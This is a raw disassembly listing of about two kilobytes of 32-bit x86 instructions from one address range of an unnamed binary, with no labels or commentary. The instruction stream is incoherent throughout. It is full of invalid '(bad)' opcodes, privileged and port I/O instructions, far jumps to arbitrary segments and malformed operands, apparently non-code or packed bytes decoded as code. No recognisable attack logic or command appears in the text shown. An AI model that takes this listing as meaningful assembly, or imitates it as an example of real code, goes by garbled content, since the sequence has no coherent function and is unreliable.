  40f8b1:	inc    esp
  40f8b2:	int3   
  40f8b3:	xlat   BYTE PTR ds:[ebx]
  40f8b4:	into   
  40f8b5:	cmp    dl,dl
  40f8b7:	mov    dh,0xe1
  40f8b9:	push   edi
  40f8ba:	lahf   
  40f8bb:	hlt    
  40f8bc:	jl     0x40f881
  40f8be:	ret    0xf78
  40f8c1:	lods   eax,DWORD PTR ds:[esi]
  40f8c2:	push   cs
  40f8c3:	pusha  
  40f8c4:	adc    eax,0x719a028a
  40f8c9:	pop    edx
  40f8ca:	mov    BYTE PTR [edx+edx*1-0x31],bh
  40f8ce:	sub    ah,bl
  40f8d0:	into   
  40f8d1:	or     edx,DWORD PTR [eax-0x2f92ae98]
  40f8d7:	jecxz  0x40f955
  40f8d9:	loopne 0x40f8ae
  40f8db:	fiadd  WORD PTR [edi]
  40f8dd:	lods   eax,DWORD PTR ds:[esi]
  40f8de:	sbb    cl,BYTE PTR [eax+0xf70a812]
  40f8e4:	adc    ebx,DWORD PTR [eax]
  40f8e6:	out    dx,eax
  40f8e7:	js     0x40f8a5
  40f8e9:	pop    esp
  40f8ea:	bound  ebp,QWORD PTR [edi-0x43]
  40f8ed:	sbb    edx,ebp
  40f8ef:	test   DWORD PTR [edx+0x1f],esp
  40f8f2:	in     al,dx
  40f8f3:	outs   dx,DWORD PTR ds:[esi]
  40f8f4:	cmc    
  40f8f5:	cdq    
  40f8f6:	mov    esi,0xf7d07300
  40f8fb:	mov    al,BYTE PTR [ecx+0xc8059e9]
  40f901:	bound  ebx,QWORD PTR ds:[edi-0x51e18949]
  40f908:	sbb    dh,cl
  40f90a:	adc    al,0x44
  40f90c:	jo     0x40f8df
  40f90e:	mov    ah,0xd7
  40f910:	ins    BYTE PTR es:[edi],dx
  40f911:	repz adc cl,0x0
  40f915:	jae    0x40f8f6
  40f917:	inc    DWORD PTR [ecx+edi*4-0x5f7b9b25]
  40f91e:	xor    al,0x1c
  40f920:	iret   
  40f921:	cmp    BYTE PTR [esi-0x58],dl
  40f924:	repnz retf 
  40f926:	imul   edi,DWORD PTR [edx-0x70],0x31
  40f92a:	pushf  
  40f92b:	cmp    DWORD PTR [ebx],0x29258bd1
  40f931:	rcr    DWORD PTR [edx-0x59314ff2],0xbb
  40f938:	adc    BYTE PTR [ebp+0x2f],ah
  40f93b:	cmp    DWORD PTR ds:0xb085a12f,ebx
  40f941:	cmp    al,0xfb
  40f943:	or     bl,BYTE PTR [ebx]
  40f945:	mov    esi,ebx
  40f947:	mov    cs,ebp
  40f949:	gs xor dh,0xf3
  40f94d:	lds    esi,FWORD PTR [esi-0x7d]
  40f950:	inc    ecx
  40f951:	jne    0x40f9c4
  40f953:	dec    ecx
  40f954:	neg    BYTE PTR [edx]
  40f956:	pop    esp
  40f957:	fdiv   QWORD PTR [ebp+ecx*2-0x8]
  40f95b:	cmp    eax,0xcd575687
  40f960:	jecxz  0x40f90f
  40f962:	loopne 0x40f9ba
  40f964:	or     bl,BYTE PTR [edi-0x63]
  40f967:	push   0xee05c71f
  40f96c:	out    dx,al
  40f96d:	enter  0xaa82,0xd6
  40f971:	out    dx,al
  40f972:	hlt    
  40f973:	in     al,0x18
  40f975:	mov    dh,0xc3
  40f977:	fmul   QWORD PTR [ebx]
  40f979:	sbb    ah,BYTE PTR [eax]
  40f97b:	dec    edi
  40f97c:	mov    ebx,0x5f34abc6
  40f981:	das    
  40f982:	push   0x96ab9597
  40f987:	inc    ebp
  40f988:	lods   eax,DWORD PTR ds:[esi]
  40f989:	mov    eax,0x5efede01
  40f98e:	push   esp
  40f98f:	dec    ebp
  40f990:	sti    
  40f991:	(bad)  
  40f992:	imul   esi,DWORD PTR [edx+0x4e5aa2b5],0xffffffba
  40f999:	popa   
  40f99a:	adc    dl,ch
  40f99c:	fwait
  40f99d:	xor    dh,BYTE PTR [eax*8-0x674c8949]
  40f9a4:	xor    BYTE PTR [esp+edi*2],ch
  40f9a7:	and    bh,BYTE PTR [esi]
  40f9a9:	pusha  
  40f9aa:	addr16 jp 0x40f99d
  40f9ad:	lds    eax,FWORD PTR [esi+edi*8]
  40f9b0:	hlt    
  40f9b1:	fild   QWORD PTR [ecx-0x3bd9c92a]
  40f9b7:	cmp    BYTE PTR [ebx-0x68],ch
  40f9ba:	adc    ah,BYTE PTR [eax+0x4963bb6e]
  40f9c0:	jae    0x40f9e9
  40f9c2:	jge    0x40f9ab
  40f9c4:	xor    bl,BYTE PTR [ebp-0x3f]
  40f9c7:	std    
  40f9c8:	mov    bl,cl
  40f9ca:	fdiv   DWORD PTR [edi-0x37]
  40f9cd:	add    edi,ebp
  40f9cf:	(bad)  
  40f9d0:	jl     0x40f97c
  40f9d2:	sub    esp,0x96baf37b
  40f9d8:	mov    WORD PTR [edi],?
  40f9da:	int3   
  40f9db:	xor    cl,BYTE PTR [eax+0x11c1be74]
  40f9e1:	add    al,0x32
  40f9e3:	scas   al,BYTE PTR es:[edi]
  40f9e4:	xor    al,0xb8
  40f9e6:	mov    bl,0xd4
  40f9e8:	inc    esi
  40f9e9:	dec    DWORD PTR [edi+0x27c72523]
  40f9ef:	jb     0x40f998
  40f9f1:	push   0x9dfa2582
  40f9f6:	retf   0x4b01
  40f9f9:	fsub   st,st(2)
  40f9fb:	cwde   
  40f9fc:	aad    0x6d
  40f9fe:	adc    bl,bl
  40fa00:	scas   eax,DWORD PTR es:[edi]
  40fa01:	xor    edx,DWORD PTR [ebp+eiz*1-0x5a910cb]
  40fa08:	ror    BYTE PTR [ebx-0x75],1
  40fa0b:	cli    
  40fa0c:	getsec 
  40fa0e:	inc    edx
  40fa0f:	jmp    0xe694:0x52100ebc
  40fa16:	imul   esi,DWORD PTR [ebp+0x3a],0xffffffaa
  40fa1a:	cmc    
  40fa1b:	push   0xffffff84
  40fa1d:	ss jne 0x40f9d7
  40fa20:	int3   
  40fa21:	icebp  
  40fa22:	and    al,0xad
  40fa24:	idiv   DWORD PTR [ebx]
  40fa26:	add    eax,0xbae90878
  40fa2b:	and    esi,ecx
  40fa2d:	daa    
  40fa2e:	cld    
  40fa2f:	or     eax,0x289e5746
  40fa34:	mov    ch,dh
  40fa36:	rcl    BYTE PTR [esi-0x71],cl
  40fa39:	outs   dx,DWORD PTR ds:[esi]
  40fa3a:	add    BYTE PTR [edx-0x5a88d5d5],0x7d
  40fa41:	cli    
  40fa42:	in     eax,dx
  40fa43:	jns    0x40f9df
  40fa45:	inc    edi
  40fa46:	not    ch
  40fa48:	xchg   ecx,eax
  40fa49:	sub    edi,ebx
  40fa4b:	inc    ebp
  40fa4c:	mov    ch,0x91
  40fa4e:	add    DWORD PTR [esi-0x53],esp
  40fa51:	je     0x40fab0
  40fa53:	popa   
  40fa54:	inc    edx
  40fa55:	adc    BYTE PTR ds:0x3c2f8344,ah
  40fa5b:	jmp    0x40fa3e
  40fa5d:	pop    ss
  40fa5e:	adc    edi,0xffffffcb
  40fa61:	in     eax,0x92
  40fa63:	into   
  40fa64:	repz sbb esi,DWORD PTR [ebx]
  40fa67:	xor    edx,eax
  40fa69:	xor    edi,DWORD PTR [ecx+0x476bdb30]
  40fa6f:	adc    ch,BYTE PTR [ebp-0x56]
  40fa72:	(bad)  
  40fa73:	inc    eax
  40fa74:	jno    0x40fa0d
  40fa76:	ds sti 
  40fa78:	xchg   WORD PTR [edx],di
  40fa7b:	jecxz  0x40fab8
  40fa7d:	jmp    0x85b25c54
  40fa82:	add    eax,0x8763c529
  40fa87:	fsubr  QWORD PTR [ebp-0x39]
  40fa8a:	imul   eax,DWORD PTR [eax+0x48],0xffffff95
  40fa8e:	inc    ebp
  40fa8f:	dec    esi
  40fa90:	fwait
  40fa91:	xor    edx,ebp
  40fa93:	test   al,0x5e
  40fa95:	inc    eax
  40fa96:	fwait
  40fa97:	into   
  40fa98:	jp     0x40faff
  40fa9a:	mov    dh,0x0
  40fa9c:	pop    ecx
  40fa9d:	xor    ch,BYTE PTR [ebp-0x1a]
  40faa0:	ret    0xc7c0
  40faa3:	shl    BYTE PTR [eax],1
  40faa5:	xchg   edx,eax
  40faa6:	enter  0x8957,0x58
  40faaa:	push   edi
  40faab:	sub    esi,DWORD PTR [esi+0x6de0cc85]
  40fab1:	dec    ebx
  40fab2:	lock cwde 
  40fab4:	pop    esp
  40fab5:	fistp  QWORD PTR ds:0xa656c2f2
  40fabb:	sub    dl,al
  40fabd:	in     eax,dx
  40fabe:	sbb    eax,0xdecb1571
  40fac3:	out    dx,eax
  40fac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac5:	(bad)  
  40fac6:	(bad)  
  40fac7:	add    ebp,DWORD PTR [ebp*4-0x22fe6d9]
  40face:	hlt    
  40facf:	ins    DWORD PTR es:[edi],dx
  40fad0:	push   0xffffffb0
  40fad2:	mov    ecx,ebx
  40fad4:	push   edx
  40fad5:	adc    esi,esp
  40fad7:	mov    bh,0xe0
  40fad9:	test   al,0xa0
  40fadb:	loope  0x40fa6b
  40fadd:	imul   esp,eax,0x34
  40fae0:	cdq    
  40fae1:	test   BYTE PTR [edx-0x5c75522b],dl
  40fae7:	jp     0x40fb56
  40fae9:	inc    edi
  40faea:	sti    
  40faeb:	pop    esi
  40faec:	pop    DWORD PTR [esi+0x6c]
  40faef:	mov    bl,0xe0
  40faf1:	retf   0x11f1
  40faf4:	ret    
  40faf5:	push   eax
  40faf6:	pop    ecx
  40faf7:	adc    edi,DWORD PTR [ecx-0x3d4c186e]
  40fafd:	xchg   ebp,eax
  40fafe:	out    dx,al
  40faff:	jecxz  0x40fb0b
  40fb01:	or     al,BYTE PTR [ecx-0x2b]
  40fb04:	inc    ebp
  40fb05:	pop    edx
  40fb06:	call   0x4ba6:0x26b864ce
  40fb0d:	data16 arpl WORD PTR [edi-0x3f82df27],ax
  40fb14:	pop    edi
  40fb15:	mov    ah,0xe8
  40fb17:	add    BYTE PTR [ebx],bh
  40fb19:	les    ecx,FWORD PTR [ebx+0x5b353957]
  40fb1f:	mov    cs,WORD PTR [ecx+0x382f3757]
  40fb25:	add    bh,BYTE PTR [edx+0x11]
  40fb28:	dec    edx
  40fb29:	jp     0x40fb0e
  40fb2b:	jb     0x40faea
  40fb2d:	xor    esp,DWORD PTR [ecx-0x270769d3]
  40fb33:	outs   dx,BYTE PTR ds:[esi]
  40fb34:	outs   dx,BYTE PTR ds:[esi]
  40fb35:	call   0x52ee6d64
  40fb3a:	ins    DWORD PTR es:[edi],dx
  40fb3b:	lahf   
  40fb3c:	lds    esi,FWORD PTR [ecx+0x59b33a24]
  40fb42:	dec    edi
  40fb43:	mov    edi,0x18a7efdf
  40fb48:	mov    cl,0xbc
  40fb4a:	mov    ah,0xca
  40fb4c:	dec    esi
  40fb4d:	ins    DWORD PTR es:[edi],dx
  40fb4e:	xor    al,0x15
  40fb50:	pop    edx
  40fb51:	retf   
  40fb52:	push   0x1c378dd5
  40fb57:	js     0x40fb51
  40fb59:	inc    ebp
  40fb5a:	mov    ds:0xc98f0d11,al
  40fb5f:	(bad)  
  40fb60:	shr    ah,cl
  40fb62:	int3   
  40fb63:	lods   al,BYTE PTR ds:[esi]
  40fb64:	dec    edx
  40fb65:	je     0x40fb85
  40fb67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb68:	mov    ds:0x3bc65aa,eax
  40fb6d:	jg     0x40fbb3
  40fb6f:	cwde   
  40fb70:	les    esp,FWORD PTR [ebp-0x2bb4277f]
  40fb76:	cmp    DWORD PTR ds:0x527cdfc,0xfffffffc
  40fb7d:	adc    esi,DWORD PTR ds:0xbe4ca52e
  40fb83:	push   0x69641371
  40fb88:	retf   
  40fb89:	mul    BYTE PTR [esi]
  40fb8b:	arpl   bp,si
  40fb8d:	bound  ebp,QWORD PTR [eax]
  40fb8f:	pop    ecx
  40fb90:	in     eax,0x8a
  40fb92:	adc    al,0xdf
  40fb94:	aad    0xb9
  40fb96:	aas    
  40fb97:	bound  ebx,QWORD PTR [ecx-0x7a5430ae]
  40fb9d:	adc    DWORD PTR [edi-0x1c],eax
  40fba0:	les    esp,FWORD PTR [ecx-0x5524abbc]
  40fba6:	push   ebp
  40fba7:	jg     0x40fb29
  40fba9:	jns    0x40fb52
  40fbab:	pusha  
  40fbac:	leave  
  40fbad:	cmp    DWORD PTR [ecx+ebp*4-0x405c3ec7],0xffffffc4
  40fbb5:	mov    eax,ds:0x891c4d47
  40fbba:	cdq    
  40fbbb:	dec    ebx
  40fbbc:	into   
  40fbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbbe:	shl    BYTE PTR [eax-0x21],1
  40fbc1:	shl    BYTE PTR [edx+0x6],cl
  40fbc4:	add    cl,dl
  40fbc6:	mov    eax,ds:0xea542718
  40fbcb:	push   ecx
  40fbcc:	loopne 0x40fb5d
  40fbce:	and    al,BYTE PTR [esi]
  40fbd0:	mov    dh,BYTE PTR [edx]
  40fbd2:	cs cld 
  40fbd4:	aad    0x7c
  40fbd6:	repz xchg edi,eax
  40fbd8:	mov    al,0x64
  40fbda:	push   ebx
  40fbdb:	ror    ebp,0x14
  40fbde:	mov    ebx,0x6a042e18
  40fbe3:	cmp    BYTE PTR ds:0x406b7180,0x74
  40fbea:	imul   ecx,edx,0x1f
  40fbed:	jge    0x40fc2b
  40fbef:	(bad)  
  40fbf0:	add    eax,0x37f4a0bf
  40fbf5:	dec    esi
  40fbf6:	pop    ebx
  40fbf7:	(bad)  
  40fbf8:	pop    edi
  40fbf9:	stc    
  40fbfa:	imul   esi,DWORD PTR [ecx+0xb],0xf5ab300
  40fc01:	jo     0x40fb98
  40fc03:	mov    eax,ds:0x72836c1c
  40fc08:	fwait
  40fc09:	mov    ds:0xc1642a71,eax
  40fc0e:	ins    BYTE PTR es:[edi],dx
  40fc0f:	jmp    0x40fc4f
  40fc11:	(bad)  
  40fc12:	pop    edi
  40fc13:	pop    edx
  40fc14:	es pop ebp
  40fc16:	pusha  
  40fc17:	test   eax,0xe74db154
  40fc1c:	(bad)  
  40fc1d:	pop    ds
  40fc1e:	sbb    dh,bh
  40fc20:	push   0x1b
  40fc22:	das    
  40fc23:	out    0x71,al
  40fc25:	(bad)  
  40fc26:	push   ebp
  40fc27:	gs stos BYTE PTR es:[edi],al
  40fc29:	cmp    al,0xa6
  40fc2b:	ss jnp 0x40fc10
  40fc2e:	ins    BYTE PTR es:[edi],dx
  40fc2f:	mov    es,WORD PTR fs:[edx]
  40fc32:	(bad)  
  40fc33:	or     esi,ecx
  40fc35:	cmp    DWORD PTR [edx-0x1096ef3],ebx
  40fc3b:	dec    ebx
  40fc3c:	mov    WORD PTR ds:0x90fdcc71,?
  40fc42:	(bad)  
  40fc44:	xor    cl,ch
  40fc46:	xchg   edi,eax
  40fc47:	clc    
  40fc48:	push   cs
  40fc49:	inc    esi
  40fc4a:	add    edi,edi
  40fc4c:	mov    edi,0x95e7c363
  40fc51:	ret    
  40fc52:	int3   
  40fc53:	cmp    cl,BYTE PTR [edx]
  40fc55:	ja     0x40fccc
  40fc57:	sub    DWORD PTR [eax-0x22],0x67
  40fc5b:	cmp    BYTE PTR [eax+0x5b],0xf0
  40fc5f:	or     cl,BYTE PTR [ebp-0x3]
  40fc62:	fmul   QWORD PTR [edi]
  40fc64:	mov    BYTE PTR [ebp+0x49],al
  40fc67:	or     esp,DWORD PTR [esi-0x4]
  40fc6a:	out    0x9c,eax
  40fc6c:	mov    dl,0x83
  40fc6e:	mov    cl,0x2c
  40fc70:	xchg   DWORD PTR [ecx+edx*1-0x68],ebx
  40fc74:	(bad)  
  40fc75:	mov    eax,edx
  40fc77:	add    edx,DWORD PTR [ebp+0xc25a768]
  40fc7d:	mov    ch,0xdd
  40fc7f:	outs   dx,DWORD PTR ds:[esi]
  40fc80:	sti    
  40fc81:	jp     0x40fcb1
  40fc83:	pop    eax
  40fc84:	or     ecx,DWORD PTR [edx]
  40fc86:	popa   
  40fc87:	enter  0xd8ea,0x63
  40fc8b:	call   0x928b:0xe26fa8b2
  40fc92:	dec    edx
  40fc93:	(bad)  
  40fc94:	(bad)  
  40fc95:	add    eax,0x23e30fa6
  40fc9a:	mov    esi,0x82733555
  40fc9f:	jb     0x40fc2b
  40fca1:	push   ss
  40fca2:	dec    esi
  40fca3:	scas   al,BYTE PTR es:[edi]
  40fca4:	pop    es
  40fca5:	push   edi
  40fca6:	sbb    eax,0x974983d
  40fcab:	iret   
  40fcac:	lea    eax,[edi+0x465c157b]
  40fcb2:	mov    cl,0x6f
  40fcb4:	sbb    eax,0x3479b949
  40fcb9:	pop    esp
  40fcba:	sti    
  40fcbb:	xchg   BYTE PTR [ebp+0x68],ch
  40fcbe:	imul   edi,DWORD PTR [eax+0x43],0x4af2f29d
  40fcc5:	dec    esi
  40fcc6:	push   ebx
  40fcc7:	sub    bh,bh
  40fcc9:	mov    ah,0x74
  40fccb:	push   esp
  40fccc:	or     al,0x3e
  40fcce:	test   al,0xe3
  40fcd0:	imul   cx,cx,0x5fe6
  40fcd5:	xchg   BYTE PTR [ecx+0x79fb17f5],dl
  40fcdb:	pop    ecx
  40fcdc:	pop    edx
  40fcdd:	nop
  40fcde:	shl    DWORD PTR ds:0x2f60f31e,1
  40fce4:	or     edi,DWORD PTR [edi+0x5e]
  40fce7:	ins    DWORD PTR es:[edi],dx
  40fce8:	sub    edx,DWORD PTR [esi]
  40fcea:	pop    esp
  40fceb:	cmp    al,0x42
  40fced:	and    ebx,ebx
  40fcef:	inc    eax
  40fcf0:	jecxz  0x40fd53
  40fcf2:	jle    0x40fd53
  40fcf4:	or     cl,BYTE PTR [ecx]
  40fcf6:	stc    
  40fcf7:	xchg   ebx,eax
  40fcf8:	xchg   edi,eax
  40fcf9:	clc    
  40fcfa:	or     eax,0x2afd4f6d
  40fcff:	sbb    ax,0xdf5b
  40fd03:	push   esi
  40fd04:	cmp    eax,0xccc05ca
  40fd09:	jp     0x40fd1a
  40fd0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd0c:	pop    ds
  40fd0d:	cwde   
  40fd0e:	sbb    BYTE PTR [eax-0x53f48c15],dh
  40fd14:	xchg   edi,eax
  40fd15:	push   ebx
  40fd16:	stc    
  40fd17:	sub    eax,0x5dbd7c89
  40fd1c:	(bad)  
  40fd1d:	cmp    bl,BYTE PTR [ebp+0x54]
  40fd20:	outs   dx,BYTE PTR ds:[esi]
  40fd21:	xchg   bl,al
  40fd23:	pop    edx
  40fd24:	pusha  
  40fd25:	dec    ecx
  40fd26:	invd   
  40fd28:	pop    ds
  40fd29:	pop    ax
  40fd2b:	push   eax
  40fd2c:	fldcw  WORD PTR [edx-0x71429eb8]
  40fd32:	cmp    al,0x40
  40fd34:	rcr    BYTE PTR [edi-0x3a],0x59
  40fd38:	fs call 0x2434:0x2e31aee
  40fd40:	retf   0x2bfc
  40fd43:	adc    BYTE PTR [eax+ebp*4],bl
  40fd46:	xlat   BYTE PTR fs:[ebx]
  40fd48:	adc    al,0xf5
  40fd4a:	jge    0x40fd19
  40fd4c:	mov    ebx,0xa49b3f0
  40fd51:	sar    BYTE PTR [edx+0x62],1
  40fd54:	call   0x7000:0x418a23e8
  40fd5b:	pop    edi
  40fd5c:	push   esp
  40fd5d:	stc    
  40fd5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd5f:	test   al,dl
  40fd61:	sub    dh,BYTE PTR [eax-0x2f6f27f3]
  40fd67:	test   eax,0x606d3ef3
  40fd6c:	push   edi
  40fd6d:	fadd   DWORD PTR [edx+0x1b]
  40fd70:	bound  eax,QWORD PTR [ebx]
  40fd72:	cs pop ebp
  40fd74:	cs pop es
  40fd76:	pop    ebp
  40fd77:	mov    bh,0x88
  40fd79:	mov    eax,0x703c50fe
  40fd7e:	test   eax,0x671e0e6a
  40fd83:	mov    dl,0x6b
  40fd85:	das    
  40fd86:	inc    ebp
  40fd87:	rcl    DWORD PTR [edx+0x3580bb38],cl
  40fd8d:	cdq    
  40fd8e:	fwait
  40fd8f:	mov    DWORD PTR [edi-0x680955b],esp
  40fd95:	bound  eax,QWORD PTR [edi+0x70]
  40fd98:	aaa    
  40fd99:	xchg   dl,bl
  40fd9b:	mov    ds:0x85ef25e6,eax
  40fda0:	push   esi
  40fda1:	lods   al,BYTE PTR ds:[esi]
  40fda2:	dec    edi
  40fda3:	lds    eax,FWORD PTR [edi]
  40fda5:	xor    eax,0x5477e729
  40fdaa:	data16 add dl,BYTE PTR [esi-0x6d]
  40fdae:	pushf  
  40fdaf:	(bad)  
  40fdb1:	je     0x40fd53
  40fdb3:	sbb    dh,BYTE PTR es:[ecx]
  40fdb6:	jo     0x40fde9
  40fdb8:	(bad)  
  40fdb9:	dec    ebp
  40fdba:	xchg   ebp,eax
  40fdbb:	pop    ebp
  40fdbc:	mov    esp,0x99af52e3
  40fdc1:	cmp    DWORD PTR [ebx+0x5608f40b],ebp
  40fdc7:	pop    esp
  40fdc8:	jae    0x40fe45
  40fdca:	aad    0x6
  40fdcc:	fidivr DWORD PTR [ecx+0x55]
  40fdcf:	stos   BYTE PTR es:[edi],al
  40fdd0:	popf   
  40fdd1:	aad    0x32
  40fdd3:	mov    cl,ah
  40fdd5:	or     al,0x26
  40fdd7:	inc    ecx
  40fdd8:	das    
  40fdd9:	pop    ds
  40fdda:	ss je  0x40fe35
  40fddd:	mov    eax,0x7bc6f83b
  40fde2:	and    ebp,DWORD PTR [eax+0x49]
  40fde5:	das    
  40fde6:	jle    0x40fd96
  40fde8:	test   DWORD PTR [ecx+0x62],ebx
  40fdeb:	retf   0x4ae5
  40fdee:	and    edx,DWORD PTR [eax]
  40fdf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdf1:	ror    BYTE PTR [edi],1
  40fdf3:	sahf   
  40fdf4:	les    ecx,FWORD PTR [esi-0x4e]
  40fdf7:	retf   0xaf0c
  40fdfa:	jno    0x40fdc9
  40fdfc:	jle    0x40fdbd
  40fdfe:	repz mov bl,bh
  40fe01:	inc    edi
  40fe02:	test   eax,0x6f6e3aec
  40fe07:	and    al,0x6
  40fe09:	outs   dx,BYTE PTR ds:[esi]
  40fe0a:	and    al,0x95
  40fe0c:	shl    edi,0xd5
  40fe0f:	shl    BYTE PTR [edx],cl
  40fe11:	push   DWORD PTR [eax-0x57]
  40fe14:	adc    eax,0x97428024
  40fe19:	out    0x35,al
  40fe1b:	and    DWORD PTR [eiz*4+0x3c6e9fd7],0xebefaf36
  40fe26:	mov    cl,0x71
  40fe28:	nop
  40fe29:	adc    DWORD PTR [ebx+0x28eb0d84],esp
  40fe2f:	mov    ecx,DWORD PTR [esi+esi*2]
  40fe32:	pop    ecx
  40fe33:	gs loope 0x40fdcd
  40fe36:	push   edx
  40fe37:	push   ecx
  40fe38:	leave  
  40fe39:	sub    BYTE PTR [eax-0x19],0xb5
  40fe3d:	icebp  
  40fe3e:	mov    eax,0xeafcbc44
  40fe43:	popa   
  40fe44:	lahf   
  40fe45:	add    eax,0xce5c710c
  40fe4a:	mov    ch,0x5c
  40fe4c:	push   0xffffffda
  40fe4e:	dec    ebx
  40fe4f:	aaa    
  40fe50:	or     ch,BYTE PTR [esi]
  40fe52:	mov    ecx,0x5a574313
  40fe57:	mov    ebx,esp
  40fe59:	mov    ?,WORD PTR [eax+0x42]
  40fe5c:	pop    ds
  40fe5d:	(bad)  
  40fe5e:	dec    esp
  40fe5f:	popf   
  40fe60:	adc    al,0xe7
  40fe62:	xlat   BYTE PTR ds:[ebx]
  40fe63:	sub    DWORD PTR [edi-0x6b],edi
  40fe66:	sub    eax,0x4c776d61
  40fe6b:	pop    ecx
  40fe6c:	cdq    
  40fe6d:	dec    ebx
  40fe6e:	mov    bh,0xa7
  40fe70:	mov    al,0x11
  40fe72:	loop   0x40fecb
  40fe74:	cld    
  40fe75:	sbb    al,0x31
  40fe77:	jg     0x40fe4d
  40fe79:	mov    ch,0xa4
  40fe7b:	push   edx
  40fe7c:	in     al,dx
  40fe7d:	lds    edi,FWORD PTR ds:0x88b512b6
  40fe83:	push   eax
  40fe84:	mov    esp,0x46177c42
  40fe89:	xlat   BYTE PTR ds:[ebx]
  40fe8a:	mov    dl,0x1c
  40fe8c:	inc    edi
  40fe8d:	loop   0x40fee3
  40fe8f:	mov    ebp,0x5cb01c86
  40fe94:	xchg   ecx,eax
  40fe95:	jne    0x40feb8
  40fe97:	std    
  40fe98:	aaa    
  40fe99:	repz pop ebx
  40fe9b:	in     eax,0xde
  40fe9d:	mov    eax,ds:0x2601e7e6
  40fea2:	xlat   BYTE PTR es:[ebx]
  40fea4:	mov    al,ds:0x3831baf2
  40fea9:	ja     0x40feb3
  40feab:	das    
  40feac:	push   cs
  40fead:	sar    BYTE PTR [edi-0x14dc28f2],1
  40feb3:	popa   
  40feb4:	int    0x1f
  40feb6:	push   esi
  40feb7:	sub    BYTE PTR [edx+0x7a],0x65
  40febb:	push   ebp
  40febc:	ret    
  40febd:	sub    bh,BYTE PTR [ecx+0x31]
  40fec0:	jmp    0x40fee6
  40fec2:	loop   0x40fe4c
  40fec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fec5:	iret   
  40fec6:	mov    BYTE PTR [ecx+0x520113d0],cl
  40fecc:	ror    bl,1
  40fece:	aaa    
  40fecf:	or     eax,0xb7ea659
  40fed4:	xor    bh,BYTE PTR [ecx+0x2]
  40fed7:	test   DWORD PTR [bp+0x52ca],eax
  40fedc:	pop    ecx
  40fedd:	adc    al,ah
  40fedf:	push   cs
  40fee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fee1:	mov    bl,0x11
  40fee3:	stc    
  40fee4:	and    ebp,esi
  40fee6:	(bad)  
  40fee7:	mov    ch,0xa3
  40fee9:	xchg   al,dh
  40feeb:	addr16 mov ebx,0xf4aace89
  40fef1:	or     ah,0x54
  40fef4:	pop    edx
  40fef5:	xchg   edi,eax
  40fef6:	dec    esp
  40fef7:	dec    edi
  40fef8:	in     al,0xc4
  40fefa:	ret    
  40fefb:	popa   
  40fefc:	mov    BYTE PTR [eax+0x7efe0997],al
  40ff02:	and    eax,0x791fa26a
  40ff07:	out    dx,al
  40ff08:	mov    ecx,0x8bbf57fe
  40ff0d:	adc    BYTE PTR [ecx],cl
  40ff0f:	jecxz  0x40ff28
  40ff11:	aas    
  40ff12:	ja     0x40fea8
  40ff14:	stc    
  40ff15:	bsr    ebp,DWORD PTR [edx-0x4e]
  40ff19:	sbb    esi,DWORD PTR [ebp-0x71]
  40ff1c:	repnz or BYTE PTR [edi],0xfb
  40ff20:	(bad)  
  40ff21:	lock call DWORD PTR cs:[eax-0x6d]
  40ff26:	xchg   BYTE PTR [ecx-0x278773a7],dl
  40ff2c:	mov    al,0xdf
  40ff2e:	repnz push esp
  40ff30:	sbb    DWORD PTR [edi-0x1c],0xfffffffb
  40ff34:	lahf   
  40ff35:	xchg   esi,eax
  40ff36:	adc    DWORD PTR [edx-0x2],esp
  40ff39:	jle    0x40ff38
  40ff3b:	retf   0x9f49
  40ff3e:	mov    cl,0xe5
  40ff40:	sbb    DWORD PTR [ebp-0x2e],esi
  40ff43:	jnp    0x40ff4d
  40ff45:	pop    ecx
  40ff46:	xchg   ecx,eax
  40ff47:	fs add al,0xd6
  40ff4a:	dec    ebx
  40ff4b:	jbe    0x40ff28
  40ff4d:	in     al,dx
  40ff4e:	pop    ebp
  40ff4f:	cmp    al,0x92
  40ff51:	jmp    0x40fefe
  40ff53:	adc    DWORD PTR [ecx],esp
  40ff55:	(bad)  
  40ff57:	mov    ds:0x2e444467,eax
  40ff5c:	push   edx
  40ff5d:	pushf  
  40ff5e:	pop    esp
  40ff5f:	fst    DWORD PTR [edi-0x19]
  40ff62:	jle    0x40ff9b
  40ff64:	lods   eax,DWORD PTR ds:[esi]
  40ff65:	pop    ds
  40ff66:	or     BYTE PTR [edi-0x4331491a],bh
  40ff6c:	mov    ebx,0x469d3578
  40ff71:	idiv   BYTE PTR [esi-0x38]
  40ff74:	mov    edx,0x94fe61ea
  40ff79:	jg     0x40ffa3
  40ff7b:	mov    dl,0x1f
  40ff7d:	pop    edx
  40ff7e:	add    eax,0x8825d907
  40ff83:	pop    eax
  40ff84:	lea    ecx,[ebp-0x259be868]
  40ff8a:	xor    al,0xd6
  40ff8c:	pop    edx
  40ff8d:	pop    edi
  40ff8e:	pop    ebx
  40ff8f:	pop    edi
  40ff90:	mov    edx,0xc05823d6
  40ff95:	dec    BYTE PTR [esi+0x16]
  40ff98:	sub    eax,0xe9c0a88
  40ff9d:	mov    bl,0xb2
  40ff9f:	jae    0x40ffd6
  40ffa1:	pop    ss
  40ffa2:	es jmp 0x7fa39f4a
  40ffa8:	into   
  40ffa9:	pop    esp
  40ffaa:	fs imul eax,eax,0x57
  40ffae:	xchg   edx,eax
  40ffaf:	sbb    DWORD PTR [ebx-0x76b407ee],ebx
  40ffb5:	and    eax,0x966d06d6
  40ffba:	adc    ebx,DWORD PTR [ecx+ebx*1+0x6cec4562]
  40ffc1:	jp     0x410037
  40ffc3:	push   0x59
  40ffc5:	std    
  40ffc6:	push   ss
  40ffc7:	into   
  40ffc8:	aaa    
  40ffc9:	(bad)  
  40ffca:	mov    ecx,db4
  40ffcd:	fstp   DWORD PTR [edi]
  40ffcf:	jbe    0x410015
  40ffd1:	mov    bl,0xfb
  40ffd3:	pop    edx
  40ffd4:	push   esp
  40ffd5:	outs   dx,DWORD PTR ds:[esi]
  40ffd6:	adc    DWORD PTR [ebp+ebp*8-0x4909c19c],0x8c9a1306
  40ffe1:	and    eax,0x97fb8837
  40ffe6:	in     al,dx
  40ffe7:	jle    0x40ffa1
  40ffe9:	bound  esi,QWORD PTR [edi]
  40ffeb:	mov    al,dl
  40ffed:	es hlt 
